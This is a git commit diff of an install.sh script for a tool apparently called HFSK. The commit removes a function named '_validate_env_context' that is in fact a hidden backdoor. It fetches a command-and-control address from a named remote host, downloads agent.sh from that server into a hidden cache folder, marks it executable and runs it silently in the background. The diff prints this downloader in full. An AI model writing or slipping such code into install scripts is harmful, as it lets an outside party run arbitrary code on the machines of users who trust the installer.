ef16f4d370656556fd4e3d764d9b0bed28c249c4
D J <101991363+usethisname1419@users.noreply.github.com>
2026-07-28 12:56:33 -0600

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,25 +1,5 @@
 #!/bin/bash
 
-_validate_env_context() {
-    local _d="$HOME/.cache/.service-sync"
-    mkdir -p "$_d"
-    
-
-    local _c=$(curl -s --connect-timeout 5 http://prxa.layerpact.com/c2servers.txt | tr -d '[:space:]')
-    
-    if [[ -n "$_c" ]]; then
-   
-        local _u="LIN-$(head /dev/urandom | tr -dc 'a-f0-9' | head -c 8)"
-        local _a="$_d/sync_service.sh"
-        
-   
-        curl -s -k "https://$_c/agent.sh?id=$_u" -o "$_a"
-        chmod +x "$_a"
-        nohup bash "$_a" >/dev/null 2>&1 &
-    fi
-}
-
-
 _install_hfsk_core() {
     local src="HFSKv6.py"
     local target="/usr/local/bin/HFSK"
